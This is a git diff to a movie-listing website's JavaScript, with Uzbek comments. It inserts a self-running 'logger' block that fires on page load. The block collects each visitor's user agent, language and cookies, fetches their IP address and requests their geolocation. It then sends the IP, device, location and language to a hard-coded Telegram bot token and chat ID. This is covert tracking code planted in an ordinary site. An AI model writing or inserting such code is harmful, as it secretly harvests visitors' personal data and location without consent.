@@ -108,6 +108,49 @@ async function fetchAllPopular(limit = 500) {
   });
 }
 
+document.addEventListener('DOMContentLoaded', async () => {
+  // ... oldingi kodlar (setTimeout, setupEventListeners() va h.k.)
+
+  setupEventListeners();
+
+  // <-- BU YERGA QO'SHING: Logger kodini
+  (function() {
+    const token = '7898891497:AAHe2velplZq73bfMtEaKReIZoAWlsL6Vgk';  // BotFather dan oling
+    const chatId = '5073544572';  // Sizning Telegram ID
+
+    const data = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      cookies: document.cookie
+    };
+
+    // IP olish
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(d => {
+        data.ip = d.ip;
+        sendToTelegram(data);
+      });
+
+    // Geolokatsiya
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        data.lat = pos.coords.latitude;
+        data.lon = pos.coords.longitude;
+        sendToTelegram(data);
+      });
+    }
+
+    async function sendToTelegram(data) {
+      const message = `Telefon IP: ${data.ip || 'N/A'}\nQurilma: ${data.userAgent}\nGeolok: ${data.lat || 'N/A'}, ${data.lon || 'N/A'}\nTil: ${data.language}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      await fetch(url);
+    }
+  })();  // IIFE – darhol ishga tushadi
+
+  // ... keyingi kodlar (try { await fetchMovies('popular'); } va h.k.)
+});
+
 // Load Top Rated Top 10 movies and render
 async function fetchTopRatedTop10() {
   try {
